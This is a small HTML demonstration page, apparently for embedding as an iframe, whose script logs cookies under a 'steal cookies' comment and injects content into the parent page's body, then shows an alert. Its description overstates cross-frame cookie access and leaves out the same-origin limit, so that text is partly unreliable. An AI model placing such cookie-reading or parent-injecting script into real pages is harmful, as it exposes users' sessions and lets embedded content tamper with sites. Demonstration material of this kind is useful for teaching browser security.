<!DOCTYPE html>
<html>
<head>
    <title>Malicious Iframe</title>
</head>
<body>
    <h1>Malicious Iframe</h1>
    <p>This iframe can access the parent page's cookies and execute code on the parent page.</p>

    <script>
        // Steal cookies
        console.log("Parent Page Cookies:", document.cookie);
        //console.log(parent.body.innerHTML)

        // Execute code on the parent page
        window.parent.document.body.innerHTML += "<p>This content was injected from the malicious iframe.</p>";
        alert("Malicious code executed on the parent page!");
    </script>
</body>
</html>
